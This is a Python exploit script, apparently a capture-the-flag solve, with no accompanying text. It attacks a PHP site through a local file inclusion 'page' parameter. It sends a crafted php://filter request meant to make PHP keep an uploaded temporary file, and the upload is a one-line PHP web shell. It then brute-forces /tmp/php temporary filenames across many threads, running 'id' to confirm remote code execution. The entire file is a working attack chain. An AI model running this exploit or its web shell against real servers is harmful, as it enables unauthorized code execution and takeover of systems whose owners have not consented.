import threading
import requests
import sys
import string

target = sys.argv[1]
charset = string.ascii_letters + string.digits


def post(target, s):
    for i in range(100):
        try:
            s.post(
                f"{target}/",
                params={
                    "page": b"php://filter/convert.quoted-printable-encode/resource=data://,\xbfAAAAAAAAAAAAAAAAAAAAAAA\xff\xff\xff\xff\xff\xff\xff\xffAAAAAAAAAAAAAAAAAAAAAAAA",
                },
                files={"a": ("b.txt", "cjiso<?=`$_GET[0]`;?>")},
            )
        except:
            pass


def lfi(target, s, a):
    for b in charset:
        for c in charset:
            for d in charset:
                for e in charset:
                    for f in charset:
                        postfix = a + b + c + d + e + f
                        r = s.get(
                            f"{target}/?page=/tmp/php{postfix}&0=echo+rceeeeee;id"
                        )
                        if "rceeeeee" in r.text:
                            print("* rce succeed")
                            print(f"* filename=/tmp/php{postfix}")
                            print(r.text)
                            sys.exit(0)


with requests.session() as sess:
    print("* upload some file")
    post(target, sess)
    print("* try lfi")
    threads = [threading.Thread(target=lfi, args=(target, sess, a)) for a in charset]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    # print("* start lfi")
    # lfi(target, sess)
